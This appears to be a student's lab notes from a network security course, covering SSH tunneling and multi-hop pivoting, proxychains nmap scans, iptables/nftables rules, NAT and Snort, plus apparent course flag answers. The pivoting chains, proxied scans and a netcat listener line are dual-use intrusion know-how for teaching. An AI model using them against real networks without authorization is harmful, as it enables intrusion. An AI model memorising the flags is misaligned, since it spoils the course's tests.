Copy/Paste the ssh-geygen message to remove the Host key from the known_hosts file

### SSH LOCAL PORT FORWARDING ###

Syntax
ssh -p <optional alt port> <user>@<pivot ip> -L <local bind port>:<tgt ip>:<tgt port> -NT
or
ssh -L <local bind port>:<tgt ip>:<tgt port> -p <alt port> <user>@<pivot ip> -NT

ssh vyos@172.16.20.1 -L 127.0.0.1:2223:172.16.1.15:22:172.16.20.21:22

Connected to 20.1 but not touched .15.22 yet..this happens when 

GATEWAY FORWARDING...

ssh student@127.0.0.1 -> If I gotta get to 15:22 you gotta go through here.. 


This command initiates an SSH (Secure Shell) connection to the remote host at IP address 172.16.20.1 with the username vyos. However, it also includes a port forwarding option (-L) that sets up a local port forwarding rule.

Here's a breakdown of what each part of the command does:

vyos@172.16.20.1: This specifies the SSH username (vyos) and the IP address of the remote host (172.16.20.1) to connect to.

-L 127.0.0.1:2223:172.16.1.15:22: This is the port forwarding configuration. It consists of two parts separated by a colon:

127.0.0.1:2223: This part specifies the local endpoint of the port forwarding. It means that on your local machine (127.0.0.1), port 2223 is being forwarded.

172.16.1.15:22: This part specifies the remote endpoint of the port forwarding. It means that traffic received on your local machine's port 2223 will be forwarded to the remote machine at IP address 172.16.1.15 on port 22 (the default SSH port).

So, what this command does is establish an SSH connection to 172.16.20.1 and sets up a local port forwarding rule where any traffic sent to your local machine on port 2223 will be forwarded to the remote machine at 172.16.1.15 on port 22. This can be useful for securely accessing services on the remote machine (172.16.1.15) as if they were running locally on your own machine, using port 2223 as the entry point.

For example, after running this command, you can SSH into the remote machine as follows:

bash
Copy code
ssh -p 2223 localhost
This connects to your local port 2223, and the SSH traffic is forwarded to the remote machine, allowing you to log in as if you were directly SSHing into 172.16.1.15.

ss -nltp

ssh 

ss -ant | grep ESTAB -> 






#### BDY ####
ssh -L 127.0.0.1:2222:172.16.1.15:22 vyos@172.16.20.1
ssh vyos@172.16.20.1 -L 127.0.0.1:2223:172.16.1.15:22  ##Same command as above, just using a different port and moving the user/password creds to a more logical place
ss -natp | grep <port #> OR grep ESTAB to see if you are listening
* double-click Terminator window to rename
(From blue-int-dmz-host-1-student-#) 1. ssh student@127.0.0.1 -p 2223 -L 127.0.0.1:4444:172.16.40.10:22
(From blue-internet-host-student-#) 2. ssh student@127.0.0.1 -p 4444

## SSH DYNAMIC PORT FORWARDING ##

ssh -D <port> -p <alt port> <user>@<pivot ip> -NT
Proxychains default port is 9050

Creates a dynamic socks4 proxy that interacts alone, or with a previously established remote or local port forward.

Allows the use of scripts and other userspace programs through the tunnel.


ssh vyos@172.16.20.1 -D 9050 # You can use any port you can but by default proxy chain uses 9050

proxychains nmap -Pn -sT 172.16.1.30/27 -p 21-23 80 # proxychain command that allows encapsulation


ssh vyos@172.16 #Tunnel through a tunnel 

Tunneling Practice 1
×
Tunnels Practice 1

Using Best Tunneling practices:

Build a Dynamic (-D) Tunnel to each system so that you can run your tools using proxychains to enumerate and interact with internal services.
Use Local (-L) and Remote (-R) tunnels where appropriate to delve deeper into the network.
Write out your commands on a piece of paper or a text editor and be ready to go over this as a class.

### EXERCISES ###

Build a Dynamic (-D) Tunnel to each system so that you can run your tools using proxychains to enumerate and interact with internal services.
Use Local (-L) and Remote (-R) tunnels where appropriate to delve deeper into the networK

ssh student@10.50.30.99 -L 127.0.0.1:2222:10.50.21.41:22

ssh student@192.168.1.39 -L 127.0.0.1:2222:10.50.21.99:22

ssh student@192.168.1.39 -L 50511:10.3.8.27:80 -NT 

## For a Dynamic tunnel: ##

ssh -D [local_port] [user]@[host]

## Local Forwarding ##
ssh [user]@[SSH_server] -p servers_port_number -L [local_created_port]:[destination_host]:[destination_port] 

## Remote Forwarding ##
ssh -R [remote_port]:[destination_host]:[destination_port] [user]@[SSH_server]
ssh [user]@[SSH_server] -R [remote_port]:[destination_host]:[destination_port] 

-L/-R created_port:target_IP:target_port

### ESTABLISHING 1ST CONNECTIONS ###

#### Going to a host with no firewall 1st step ####
1. ssh to the destination e.g. host A with the port number and the ip address to that host i.e. hostA@hostA_ip_address -p destination_port -D 9050 e.g userA@10.50.29.89 -p 1234 -D 9050

#### Going to a host with a firewall ####
1. Create a local tunnel to the destination 
2. telnet 
3. create a remote tunnel back to the source from the destination
4. From the source create a dynamic tunnel 
5. Run proxy scans to identify the next tunnel 

#### Going to a host with no firewall from another host ####
1. Create a local tunnel to the destination  
4. From the source create a dynamic tunnel 
5. Run proxy scans to identify the next tunnel 

#### TUNNELING ACTIVITY 5 ####

	# Going from Internet Host to Host A 
    >> ssh hostA@10.50.23.43 -p 22 -D 9050
    #  A dynamic tunnel to C 
    
	>> run proxy chain scans and identified Host B, on telnet 10.1.2.200 sshd 8976

	# Create a local tunnel to be used for telnet. Local tunnel to host A 
	ssh hostA@10.50.23.43 -L 1111(created_on_the_internet_host):10.1.2.200:23
	telnet localhost 1111

	# Let's create a remote tunnel back to A from B
	ssh hostA@10.1.2.130 -p 22 -R 2222(created_on_host_B):localhost:8976   

	# A local tunnel from the internet host to host A
	ssh hostA@10.50.23.43 -L 3333:localhost:2222  
	# A dynamic channel to B 
	ssh hostB@localhost -p 3333 -D 9050 # 3333 will be 2222(s)

	>> run proxy chain scans and identified Host C, with ip address 10.2.5.20 and sshd 22

	# A local tunnel to host c 
	ssh hostB@localhost -p 3333 -L 4444:10.2.5.20:22 
	# A dynamic channel to C
	ssh hostC@localhost -p 4444 -D 9050

	>> run proxy chain scans and identified Host D, with ip address 10.3.9.39 and sshd 3597

	# Create a local tunnel to be used for telnet to D
	ssh hostC@localhost -p 4444 -L 5555:10.3.9.39:23 
	telnet localhost 5555 

	# Let's create a remote tunnel back to C from D
	ssh hostC@10.3.9.33 -p 22 -R 6666:localhost(this_is_at_host_D):3597

	# A local tunnel from internet host 
	ssh hostC@localhost -p 4444 -L 7777:localhost(this_is_host_c_localhost):6666

	# Let's create a dynamic tunnel to D 
	ssh hostD@localhost -p 7777 -D 9050

	# Ran our proxy chains... 


#### TUNNELING ACTIVITY 4 ####

	telnet hostA@10.50.22.42
	# Let's remote back to A 
	ssh me@10.50.20.51 -p 22 (-p 22 is optional) -R 1111:localhost:8462 
	# From the internet host we create a dynamic channel to host A 
	ssh hostA@localhost -p 1111 -D 9050 # Creates a dynamic channel to B 

	# Ran proxy chains and discovered B with port 22 and ip address 192.168.100.60
	# Kill proxychains 

	# Let's create a local channel from host A to to host B 
    >> ssh hostA@localhost -p 1111 -L 2222:192.168.100.60:22
    #  A dynamic tunnel to B from internet host 
    >> ssh hostB@localhost -p 2222 -D 9050 # Creating a dynamic tunnel to C, 

    # Ran proxychains and discovered host C with port 6481 and ip address 10.90.50.140
	# Kill proxychains 

	# We are going to C from B and creating a local tunnel. 
	ssh hostB@localhost -p 2222 -L 3333:10.90.50.140:6481
	# From the internet host let's create a dynamic channel to host C 
	ssh hostC@localhost -p 3333 -D 9050

	# Ran proxy chains and discovered D with port 22 and ip address 172.20.21.5
	# Kill proxychains 

	# Create a local channel to host D. This creates a localhost that you can now use to telnet
	ssh hostC@localhost -p 3333 -L 4444:172.20.21.5:23

	# Let's telnet to D 
	telnet localhost 4444

	# Let's create a remote tunnel back to C from D
	ssh hostC@172.20.21.4 -p 6481 -R 5555:localhost:22

	# A local tunnel from internet host 
	ssh hostC@localhost(this_refers_to_internet_host) -p 3333 -L 6666:localhost(this_refers_to_c):5555
	
	# Let's create a dynamic tunnel to D 
	ssh hostD@localhost -p 6666 -D 9050

	# Ran our proxy chains... 

Telnet Internet Host to Host A:
	
#### TUNNELING ACTIVITY 3 ####

	Internet Host to Host A
    >> ssh userA@10.50.29.89 -p 1234 -D 9050
    >> ssh userA@10.50.29.89 -p 1234 -L 1111:172.17.17.28:23 ???? # there's a firewall to B, why are we creating this before telneting? 

	Host A Host B
    >> telnet localhost 1111

    Host B Host A
    >> ssh userA@172.17.17.17 -p 1234(authenticating_to_A) -R 2222(created_port_on_A):localhost(host_B):4321(ssh_port_on_B) # Ran on B back to A
    >> ssh userA@10.50.29.89 -p 1234 -L 3333:localhost:2222 # Ran on the internet host. Authenticate back to A to target local_host_2222 on A
    >> ssh userB@localhost -p 3333 -D 9050 # Creates a dynamic channel to B 
	# Ran proxychains and got 1212 and 192.168.30.150


    # Host B from C ---->  Lets get to Host C from B 
    >> ssh userB@localhost -p 3333 (this_gets_me_to_B) -L 4444:192.168.30.150:1212
    #  A dynamic tunnel to C 
    >> ssh userC@localhost -p 4444 -D 9050 # Creating a dynamic tunnel to C, ssh to C 
    # Ran proxychains and discovered host D with port 2932 and ip address 10.10.12.121

    # We are going to c and creating a local tunnel. 
    >> ssh userC@localhost -p 4444 -L 5555:10.10.12.121:2932 # Is this ran from the internet host???

    # SSH and use a dynamic tunnel to D 
    >> ssh userD@localhost -p 5555 -D 9050

    # 2222, 3333, 4444 and 5555 are all created ports... 



#### TUNNELING ACTIVITY 2 ####

    >> telnet userA@10.50.29.19
	Host A  Internet Host SSH IP
	ssh me@10.50.23.21 -R 1111:localhost:22      ------ REMOTE

	Window 3 scan window Internet Host
	--proxyChains 10.1.2.16.16/28
	--proxychains nmap -Pn -sT 10.1.2.16.16 -p 21-23,80,2222

	Window 2x1 (2)
	Internet Host to Host A acc to B
	>> ssh userA@localhost -p 1111 -L 1222:10.1.2.16.18:2222

	Window 4
	Internet Host to Host B
	>> ssh userB@127.0.0.1 -p 1222 -D 9050      ------ CLOSE 9050 2x2

	Window 3 Internet Host
	--proxychains 172.16.10.96/27
	--proxychains nmap -Pn -sT 172.16.10.96 -p 21-23,80,2323

	Window 2x2 (3)
	Internet Host  to Host B acc to C
	ssh userB@localhost -p 1222 -L 3333:172.16.10.121:2323

	Window 4 Internet Host to Host C
	ssh userC@127.0.0.1 -p 3333 -D 9050      ------ CLOSE 9050 2x3

	Window 3  Internet Host
	--proxychains 192.168.10.64/26
	--proxychains nmap -Pn -sT 192.168.10.69 -p 21-23,80

	Window 2x3 (4)
	ssh userC@localhost -p 3333 -L 4444:192.168.10.69:22

	Window 5
	Internet Host
	ssh userD@127.0.0.1 -p4444 -D 9050


Telnet Internet Host to Host A:
	>> telnet userA@10.50.29.19
	Host A  Internet Host SSH IP
	ssh me@10.50.23.21 -R 1111:localhost:22      ------ REMOTE

	Window 2
	Internet Host to Host A
	>> ssh userA@localhost -p 1111 -D 9050      ------ CLOSE 9050 2x1

	Window 3 scan window Internet Host
	--proxyChains 10.1.2.16.16/28
	--proxychains nmap -Pn -sT 10.1.2.16.16 -p 21-23,80,2222

	Window 2x1 (2)
	Internet Host to Host A acc to B
	>> ssh userA@localhost -p 1111 -L 1222:10.1.2.16.18:2222

	Window 4
	Internet Host to Host B
	>> ssh userB@127.0.0.1 -p 1222 -D 9050      ------ CLOSE 9050 2x2

	Window 3 Internet Host
	--proxychains 172.16.10.96/27
	--proxychains nmap -Pn -sT 172.16.10.96 -p 21-23,80,2323

	Window 2x2 (3)
	Internet Host  to Host B acc to C
	ssh userB@localhost -p 1222 -L 3333:172.16.10.121:2323

	Window 4 Internet Host to Host C
	ssh userC@127.0.0.1 -p 3333 -D 9050      ------ CLOSE 9050 2x3

	Window 3  Internet Host
	--proxychains 192.168.10.64/26
	--proxychains nmap -Pn -sT 192.168.10.69 -p 21-23,80

	Window 2x3 (4)
	ssh userC@localhost -p 3333 -L 4444:192.168.10.69:22

	Window 5
	Internet Host
	ssh userD@127.0.0.1 -p4444 -D 9050


# For a Dynamic tunnel to A:
ssh -D 9050 student_A@10.50.30.99 # -> This should be killed scan
proxychains ./scan.sh

# For a Local tunnel to A to tgt B:
ssh student_A@10.50.30.99 -L 1234:192.168.1.39:22

# For a Dynamic tunnel to B:
ssh student_B@127.0.0.1 -p 1234 -D 9050
proxychains ./scan.sh

# For a local channel From B to C 
ssh student_B@127.0.0.1 -p 1234 -L 5678:10.0.0.50:22

# For a Dynamic tunnel to C:
ssh student_C@127.0.0.1 -p 5678 -D 9050
proxychains ./scan.sh #close -D after 


# For a local channel From C to D
ssh student_C@127.0.0.1 -p 5678 -L 9090:172.16.1.8:22

# For a Dynamic tunnel to D:
ssh student_D@127.0.0.1 -p 9090 -D 9050 # -D is optional at this state

# Local Forwarding
ssh -L [local_port]:[destination_host]:[destination_port] [user]@[SSH_server]
ssh -L 1234:10.50.30.99:22 student@10.50.30.99


# Remote Forwarding
ssh -R [remote_port]:[destination_host]:[destination_port] [user]@[SSH_server]


# NETWORK ANALYSIS #

In-Line
    TAP - Test Access Point
    MitM - Man-in-the-Middle
Out of Band (Passive)
    Switched Port Analyzer (SPAN)

P0F (PASSIVE OS FINGERPRINTING)
Looks at variations in initial TTL, fragmentation flag, default IP header packet length, window size, and TCP options

Configuration stored in:

 /etc/p0f/p0f.fp

Statistics -> Protocol Hierachy
Statistics -> ipV4
Analyze->Expert Information


## FILTERING ## 

BLOCK-LISTING VS ALLOW-LISTING
Block-Listing (Formerly Black-List)

Implicit ACCEPT

Explicit DENY

Allow-Listing (Formerly White-List)

Implicit DENY

Explicit ACCEPT

#### FIREWALL FILTERING METHODS

1. Stateless (Packet) Filtering (L3+4)
2. Stateful Inspection (L4)
3. Circuit-Level (L5)
4. Application Layer (L7)
5. Next Generation (NGFW) (L7) 

###### IP Tables ######

Iptables is a Linux firewall program that monitors traffic to and from a server. 

iptbales -t [table/filter(default)/not/mangle] -[A(append)/I(insert)/R(specifies a table)/D(deletes_a_table)] [chain] [rule(do something. Anything coming from x going to Y)] -j [action = accept/reject/drop] 

reject -> sends ICMP response
drop -> no response

Do you wanna let them know that you dropped them or not? 

iptables -t [table] -A [chain] [rules] -j [action]
in an input chain, you don't need to specify the source... don't specify the source on a network...
ip tables -p is to specify a protocol 

###### IPTABLES RULES SYNTAX ######

-p icmp [ --icmp-type { type# | code# } ]
-p tcp [ --sport | --dport { port1 |  port1:port2 (cannot do comma delimited) } ]
-p tcp [ --tcp-flags { SYN | ACK | PSH | RST | FIN | URG | ALL | NONE } ]
-p udp [ --sport | --dport { port1 | port1:port2 } ]

nft is the command line tool used to set up, maintain and inspect packet filtering and classification rules in the Linux kernel, in the nftables framework.

nft add table [family/ip/ip6/inet] [name]

nft add chain [family] [table] [chain] { type [type] hook [hook]
    priority [priority] \; policy [policy] \;}
* [chain] = User defined name for the chain.

* [type] =  can be filter, route or nat.

* [hook] = prerouting, ingress, input, forward, output or
         postrouting.

* [priority] = user provided integer. Lower number = higher
             priority. default = 0. Use "--" before
             negative numbers.

* ; [policy] ; = set policy for the chain. Can be
              accept (default) or drop.

Use "\" to escape the ";" in bash -> \ is used to make sure it runs as one command... ; is a command separator

nft add rule [family] [table] [chain] [matches (matches)] [statement]
* [matches] = typically protocol headers(i.e. ip, ip6, tcp,
            udp, icmp, ether, etc)

* (matches) = these are specific to the [matches] field.

* [statement] = action performed when packet is matched. Some
              examples are: log, accept, drop, reject,
              counter, nat (dnat, snat, masquerade)

###### RULE MATCH OPTIONS ######

ip [ saddr | daddr { ip | ip1-ip2 | ip/CIDR | ip1, ip2, ip3 } ]
tcp flags { syn, ack, psh, rst, fin }
tcp [ sport | dport { port1 | port1-port2 | port1, port2, port3 } ]
udp [ sport| dport { port1 | port1-port2 | port1, port2, port3 } ]
icmp [ type | code { type# | code# } ]

###### RULE MATCH OPTIONS ######

ct state { new, established, related, invalid, untracked }
iif [iface]
oif [iface]

###### MODIFY NFTABLES ######

nft { list | flush } ruleset
nft { delete | list | flush } table [family] [table]
nft { delete | list | flush } chain [family] [table] [chain]

###### MODIFY NFTABLES ######

List table with handle numbers

nft list table [family] [table] [-a]
Adds after position

nft add rule [family] [table] [chain] [position <position>] [matches] [statement]
Inserts before position

nft insert rule [family] [table] [chain] [position <position>] [matches] [statement]
Replaces rule at handle

nft replace rule [family] [table] [chain] [handle <handle>] [matches] [statement]
Deletes rule at handle

nft delete rule [family] [table] [chain] [handle <handle>]

nftables is a subsystem of the Linux kernel providing filtering and classification of network packets/datagrams/frames. It's the successor to iptables and offers a more efficient way to manage network packets. Understanding nftables involves comprehending tables, chains, rules, and match options. Here's a breakdown of these components:

Tables
Purpose: Tables are containers for several chains. They are primarily used to organize the structure of the firewall settings.
Types: Tables can be of different types, like filter, nat, etc., each serving a different purpose or dealing with different kinds of network traffic.
Scope: They define the namespace for chains. You can have multiple tables, each with its own set of chains.

Chains
Purpose: Chains are sequences of rules that get applied to packets. They are located within tables and represent the different points in the packet processing pathways where rules can be applied.
Types: Chains can be predefined (like INPUT, OUTPUT, FORWARD in the filter table) or user-defined.
Flow: Packets are processed sequentially through rules in a chain until a rule matches and decides the fate of the packet (accept, drop, queue, etc.) or the end of the chain is reached.

Rules
Purpose: Rules are the actual conditions that get applied to packets. Each rule contains criteria that a packet must match and an action to take if the packet matches the criteria.
Structure: A rule is made up of matches (criteria like source/destination IP, port, protocol, etc.) and a target/action (like accept, drop, reject, etc.).
Specificity: Rules are very specific and are where the bulk of the packet filtering logic resides.

Rule Match Options
Purpose: Match options are the conditions used within rules to match network packets. They specify what aspects of a packet should be examined.
Examples: IP source/destination, port numbers, protocol type, TCP flags, etc.

Flexibility: Match options are quite flexible and allow for a broad range of criteria to be defined.
Differences and Relationships

Tables vs Chains: Tables are like containers or namespaces for chains. Tables organize chains into distinct sets, often based on their function or the type of traffic they handle.

Chains vs Rules: Chains are sequences of rules. A chain defines the path that packets follow and the rules within a chain define the actions taken on the packets.

Rules vs Match Options: Rules contain match options. Match options are the specific conditions within a rule that a packet must meet for the rule's action to be executed.

In summary, nftables organizes its firewall settings in a hierarchical manner: tables contain chains, chains contain rules, and rules contain match options. This structure provides a clear and flexible framework for defining complex firewall configurations.

nfttables
	chains
		rules
			match options

iptables -t nat -A POSTROUTING -o eth0 -s 192.168.0.1 -j SNAT --to 1.1.1.1


The iptables command you've provided is configuring a Source Network Address Translation (SNAT) rule. Here's a breakdown of what this command does:

iptables: This is the command for interacting with the Linux kernel's netfilter framework, which is used for packet filtering, network address translation (NAT), and port translation.

-t nat: This option specifies the table to which the rule is being added. In this case, it's the nat table, which is used for network address translation.

-A POSTROUTING: The -A option appends a new rule to a chain, in this case, the POSTROUTING chain. The POSTROUTING chain is used for altering packets as they are about to leave the system.

-o eth0: This specifies the output interface for the rule, which in this case is eth0. The rule will only apply to packets leaving through the eth0 network interface.

-s 192.168.0.1: This is a source address match. The rule will only apply to packets originating from the IP address 192.168.0.1.

-j SNAT: The -j option tells iptables to jump to the SNAT target (Source Network Address Translation) if the packet matches the rule. SNAT is used to change the source address of packets.

--to 1.1.1.1: This part of the command specifies the new source IP address that will be used in the SNAT process. In this case, packets originating from 192.168.0.1 and leaving through the eth0 interface will have their source IP address changed to 1.1.1.1. USE MASQUERADE if you're using things like DHCP! 


iptables -t nat -A PREROUTING -i eth0 -d 8.8.8.8 -j DNAT --to 10.0.0.1

iptables: This is the command for interacting with the Linux kernel's netfilter framework, which is used for packet filtering, network address translation (NAT), and port translation.

-t nat: This option specifies the table to which the rule is being added. In this case, it's the nat table, which is used for network address translation.

-A PREROUTING: The -A option appends a new rule to a chain, in this case, the PREROUTING chain. The PREROUTING chain is used for altering packets as soon as they arrive, before routing decisions are made.

-i eth0: This specifies the input interface for the rule, which in this case is eth0. The rule will only apply to packets arriving through the eth0 network interface.

-d 8.8.8.8: This is a destination address match. The rule will only apply to packets intended for the IP address 8.8.8.8.

-j DNAT: The -j option tells iptables to jump to the DNAT target (Destination Network Address Translation) if the packet matches the rule. DNAT is used to change the destination address of packets.

--to 10.0.0.1: This part of the command specifies the new destination IP address that will be used in the DNAT process. In this case, packets destined for 8.8.8.8 and arriving through the eth0 interface will have their destination IP address changed to 10.0.0.1.

In Simple Terms:
When a packet destined for the IP address 8.8.8.8 arrives at the system through the eth0 interface, this rule will change its destination IP address to 10.0.0.1. This type of rule is commonly used in port forwarding scenarios where traffic intended for one address (like a public IP) is redirected to another address (like an internal IP). For instance, this could be used to redirect traffic that was originally intended to reach a public DNS server (8.8.8.8) to an internal DNS server (10.0.0.1) for handling.


#### MANGLE -> #### 

In Linux, the mangle table is used to alter the IP headers of packets. It can be used to: 
Adjust the Time to Live (TTL) value of a packet
Change other IP headers
Alter locally-generated packets before routing

iptables -t mangle -A POSTROUTING -o eth0 -j TTL --ttl-set 128
iptables -t mangle -A POSTROUTING -o eth0 -j DSCP --set-dscp 26

#### MANGLE EXAMPLES WITH NFTABLES ####

nft add table ip MANGLE
nft add chain ip MANGLE INPUT {type filter hook input priority 0 \; policy accept \;}
nft add chain ip MANGLE OUTPUT {type filter hook output priority 0 \; policy accept \;}
nft add rule ip MANGLE OUTPUT oif eth0 ip ttl set 128
nft add rule ip MANGLE OUTPUT oif eth0 ip dscp set 26

### Practicals 

ssh student@172.16.82.106
iptables -t filter -A INPUT -p tcp --dport 22 -m state --state NEW,ESTABLISHED -j ACCEPT
ip tables -t filter -L

iptables -t filter -A OUTPUT -p tcp --sport 22 -m state --state NEW,ESTABLISHED -j ACCEPT
iptables -t filter -nL --line-numbers

#change policy 

sudo su
iptables -t filter -A INPUT -p tcp --dport 22 -m state --state NEW,ESTABLISHED -j ACCEPT
iptables -t filter -A OUTPUT -p tcp --sport 22 -m state --state NEW,ESTABLISHED -j ACCEPT
iptables -t filter -nL --line-numbers  (this shows what rules you've created)
iptables -t filter -P INPUT DROP
iptables -t filter -P OUTPUT DROP

shutdown -r 5 

iptables -t filter -A INPUT -p tcp -m multiport --ports 22,23,80 -m  state --state NEW, ESTABLISHED -j ACCEPT
iptables -t filter -A INPUT -p tcp -m multiport --ports 22,23,80 -m state --state NEW, ESTABLISHED -j ACCEPT

root@blue-host-1-student-11:/home/student# iptables -t filter -A INPUT -p tcp -m multiport --ports 22,23,80 -m state --state NEW,ESTABLISHED -j ACCEPT
root@blue-host-1-student-11:/home/student# iptables -t filter -A OUTPUT -p tcp -m multiport --ports 22,23,80 -m state --state NEW,ESTABLISHED -j ACCEPT


flash your rules... 
root@blue-host-1-student-11:/home/student# iptables -t filter -P INPUT ACCEPT
root@blue-host-1-student-11:/home/student# iptables -t filter -P OUTPUT ACCEPT

IF YOU DO THE FLASH BEFORE ACCEPT YOU WILL GET LOCKED OUT 

root@blue-host-1-student-11:/home/student# iptables -t filter -L
Chain INPUT (policy ACCEPT)
target     prot opt source               destination         
ACCEPT     tcp  --  anywhere             anywhere             tcp dpt:ssh state NEW,ESTABLISHED
ACCEPT     tcp  --  anywhere             anywhere             multiport ports ssh,telnet,http state NEW,ESTABLISHED

Chain FORWARD (policy ACCEPT)
target     prot opt source               destination         

Chain OUTPUT (policy ACCEPT)
target     prot opt source               destination         
ACCEPT     tcp  --  anywhere             anywhere             tcp spt:ssh state NEW,ESTABLISHED
ACCEPT     tcp  --  anywhere             anywhere             multiport ports ssh,telnet,http state NEW,ESTABLISHED
root@blue-host-1-student-11:/home/student# iptables -t filter -F
root@blue-host-1-student-11:/home/student# iptables -t filter -L

Chain INPUT (policy ACCEPT)
target     prot opt source               destination         

Chain FORWARD (policy ACCEPT)
target     prot opt source               destination         

Chain OUTPUT (policy ACCEPT)
target     prot opt source               destination         
root@blue-host-1-student-11:/home/student# 


student@blue-internet-host-student-11:~$ ssh student@172.16.82.12
^C
student@blue-internet-host-student-11:~$ ssh student@172.16.82.112
The authenticity of host '172.16.82.112 (172.16.82.112)' can't be established.
ECDSA key fingerprint is SHA256:JbBAsMDNh8ECJx9qMCJ+KQSe06ZkcGLv1S3crHRGRNw.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added '172.16.82.112' (ECDSA) to the list of known hosts.
student@172.16.82.112's password: 
Linux blue-host-3-student-11 4.19.0-18-cloud-amd64 #1 SMP Debian 4.19.208-1 (2021-09-29) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
student@blue-host-3-student-11:~$ sudo su

We trust you have received the usual lecture from the local System
Administrator. It usually boils down to these three things:

    #1) Respect the privacy of others.
    #2) Think before you type.
    #3) With great power comes great responsibility.

[sudo] password for student: 
root@blue-host-3-student-11:/home/student# nft add table ip TEST
root@blue-host-3-student-11:/home/student# nft list ruleset
table ip TEST {
}
root@blue-host-3-student-11:/home/student# nft add chain ip TEST INPUT { type filter hook input priority 0 \; policy accept \;}
root@blue-host-3-student-11:/home/student# nft add chain ip TEST OUTPUT { type filter hook output priority 0 \; policy accept \;}
root@blue-host-3-student-11:/home/student# nft list ruleset
table ip TEST {
	chain INPUT {
		type filter hook input priority 0; policy accept;
	}

	chain OUTPUT {
		type filter hook output priority 0; policy accept;
	}
}
root@blue-host-3-student-11:/home/student# nft add rule ip TEST INPUT tcp sport { 22, 23, 80} ct state {new, established} accept
root@blue-host-3-student-11:/home/student# nft add rule ip TEST OUTPUT tcp sport { 22, 23, 80} ct state {new, established} accept
root@blue-host-3-student-11:/home/student# nft add rule ip TEST INPUT tcp dport { 22, 23, 80} ct state {new, established} accept
root@blue-host-3-student-11:/home/student# nft list ruleset
table ip TEST {
	chain INPUT {
		type filter hook input priority 0; policy accept;
		tcp sport { ssh, telnet, http } ct state { established, new } accept
		tcp dport { ssh, telnet, http } ct state { established, new } accept
	}

	chain OUTPUT {
		type filter hook output priority 0; policy accept;
		tcp sport { ssh, telnet, http } ct state { established, new } accept
	}
}
root@blue-host-3-student-11:/home/student# nft add rule ip TEST OUTPUT tcp dport { 22, 23, 80} ct state {new, established} accept
root@blue-host-3-student-11:/home/student# nft list ruleset
table ip TEST {
	chain INPUT {
		type filter hook input priority 0; policy accept;
		tcp sport { ssh, telnet, http } ct state { established, new } accept
		tcp dport { ssh, telnet, http } ct state { established, new } accept
	}

	chain OUTPUT {
		type filter hook output priority 0; policy accept;
		tcp sport { ssh, telnet, http } ct state { established, new } accept
		tcp dport { ssh, telnet, http } ct state { established, new } accept
	}
}
root@blue-host-3-student-11:/home/student# nft list ruleset -a
table ip TEST { # handle 1
	chain INPUT { # handle 1
		type filter hook input priority 0; policy accept;
		tcp sport { ssh, telnet, http } ct state { established, new } accept # handle 8
		tcp dport { ssh, telnet, http } ct state { established, new } accept # handle 14
	}

	chain OUTPUT { # handle 2
		type filter hook output priority 0; policy accept;
		tcp sport { ssh, telnet, http } ct state { established, new } accept # handle 11
		tcp dport { ssh, telnet, http } ct state { established, new } accept # handle 17
	}
}
root@blue-host-3-student-11:/home/student# nft insert rule ip TEST INPUT handle 17 icmp type 8 accept
Error: Could not process rule: No such file or directory
insert rule ip TEST INPUT handle 17 icmp type 8 accept
^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
root@blue-host-3-student-11:/home/student# nft insert rule ip TEST INPUT handle 17 icmp type 8 accept
Error: Could not process rule: No such file or directory
insert rule ip TEST INPUT handle 17 icmp type 8 accept
^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
root@blue-host-3-student-11:/home/student# nft insert rule ip TEST INPUT handle 14 icmp type 8 accept
root@blue-host-3-student-11:/home/student# nft list ruleset -a
table ip TEST { # handle 1
	chain INPUT { # handle 1
		type filter hook input priority 0; policy accept;
		tcp sport { ssh, telnet, http } ct state { established, new } accept # handle 8
		icmp type echo-request accept # handle 20
		tcp dport { ssh, telnet, http } ct state { established, new } accept # handle 14
	}

	chain OUTPUT { # handle 2
		type filter hook output priority 0; policy accept;
		tcp sport { ssh, telnet, http } ct state { established, new } accept # handle 11
		tcp dport { ssh, telnet, http } ct state { established, new } accept # handle 17
	}
}
root@blue-host-3-student-11:/home/student# 


FLASHING RULES SETS GETS RID OF EVERYTHING

root@blue-host-3-student-11:/home/student# nft flush ruleset
root@blue-host-3-student-11:/home/student# nft list ruleset -a
root@blue-host-3-student-11:/home/student# 

how to open nc listener... 
nc -lvp 9001 -> etc ......



CAD: Task 1 and 2 START FLAG
×
Task 1 IP/NFTables - Host Filtering: T@bl3sth@tF1lt3r

Task 2 IP/NFTables - NAT: N@tF1lt3rsf0rL1f3







### PACKET FILTERING AND SNORTS ###

#### BOX 1 ####
student@blue-internet-host-student-11:~$ cd /etc/snort/
student@blue-internet-host-student-11:/etc/snort$ ls
rules  snort.conf

#### BOX 2 ####
tudent@blue-internet-host-student-11:~$ cd /etc/snort/rules/
student@blue-internet-host-student-11:/etc/snort/rules$ ls
icmp.rules
student@blue-internet-host-student-11:/etc/snort/rules$ cat icmp.rules 
alert icmp any any -> any any (msg:ICMP detected; sid:111; rev:1;)

student@blue-internet-host-student-11:/etc/snort/rules$ sudo snort -r ids.pcap -c /etc/snort/rules/icmp.rules 


#### BOX 3 ####



#### BOX 4 ####
student@blue-internet-host-student-11:~$ sudo snort -D -c /etc/sn
snmp/  snort/ 
student@blue-internet-host-student-11:~$ sudo snort -D -c /etc/snort/snort.conf 
student@blue-internet-host-student-11:~$ sudo snort -D -c /etc/snort/snort.conf -l /var/log/snort
student@blue-internet-host-student-11:~$ ps -ef | grep snort
student@blue-internet-host-student-11:~$ sudo kill -9 23130
student@blue-internet-host-student-11:~$ sudo snort -c /etc/snort/rules/google.rules -l /var/log/snort
student@blue-internet-host-student-11:~$ sudo snort -D -c /etc/snort/rules/google.rules -l /var/log/snort
student@blue-internet-host-student-11:~$ ping 8.8.8.8 -p 49204C4F56452050495A5A41

5050 and 


Allow ports 5050 and 5150 for both udp and tcp traffic to/from

Allow New and Established traffic to/from via HTTP


Flush all rules (this will remove all rules but keep the chains):

sh
Copy code
sudo iptables -F
Delete all custom chains:

sh
Copy code
sudo iptables -X
Optionally, you can also reset all counters:

sh
Copy code
sudo iptables -Z


### STEPS WHEN BUILDING A TUNNEL ###
1. Make a map 
2. Scan privot ip 
3. Passive -
		ip addr
		ip neighbor
		ss -anltp
